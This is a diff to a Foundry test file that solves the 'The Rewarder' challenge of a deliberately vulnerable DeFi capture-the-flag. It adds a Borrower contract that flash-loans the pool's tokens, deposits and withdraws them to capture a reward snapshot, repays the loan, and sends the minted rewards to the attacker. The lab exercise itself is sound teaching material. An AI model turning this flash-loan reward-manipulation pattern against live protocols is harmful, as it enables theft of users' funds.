@@ -10,6 +10,48 @@ import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
 
+contract Borrower {
+    uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
+    FlashLoanerPool flashLoanerPool;
+    TheRewarderPool theRewarderPool;
+    DamnValuableToken dvt;
+    RewardToken rewardToken;
+
+    address attacker;
+
+    constructor(
+        DamnValuableToken _dvToken,
+        FlashLoanerPool _flashLoanerPool,
+        TheRewarderPool _rewarderPool,
+        RewardToken _rewardToken
+    ) {
+        attacker = msg.sender;
+        dvt = _dvToken;
+        flashLoanerPool = _flashLoanerPool;
+        theRewarderPool = _rewarderPool;
+        rewardToken = _rewardToken;
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+        // approve the loaned amount and then deposit them
+        // to the reward pool
+        dvt.approve(address(theRewarderPool), amount);
+        theRewarderPool.deposit(amount);
+        // since we warped time at test we can deposit the
+        // amount to mint a lot of reward
+        theRewarderPool.withdraw(amount);
+        // pay back the loan
+        dvt.transfer(address(flashLoanerPool), amount);
+    }
+
+    function attack() external {
+        // just loooOoooooOOOOoooOooooan
+        flashLoanerPool.flashLoan(TOKENS_IN_LENDER_POOL);
+        // get rewards to complete
+        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
+    }
+}
+
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
     uint256 internal constant USER_DEPOSIT = 100e18;
@@ -88,7 +130,16 @@ contract TheRewarder is Test {
         /**
          * EXPLOIT START *
          */
+        // Advance time 5 days so that depositors can get rewards
+        vm.warp(block.timestamp + 5 days);
 
+        vm.startPrank(attacker);
+        Borrower borrower = new Borrower(dvt,
+         flashLoanerPool,
+         theRewarderPool,
+         theRewarderPool.rewardToken());
+        borrower.attack();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
